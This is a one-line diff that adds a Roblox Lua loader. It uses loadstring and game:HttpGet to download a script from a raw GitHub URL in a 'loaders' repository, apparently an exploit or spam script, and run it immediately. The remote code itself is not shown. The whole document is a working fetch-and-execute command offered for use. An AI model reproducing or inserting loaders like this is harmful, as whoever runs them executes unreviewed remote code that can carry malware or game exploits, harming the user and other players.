@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/pinkie-promise-horror-spam7-a6nz1gj1o5ow2w.lua"))()
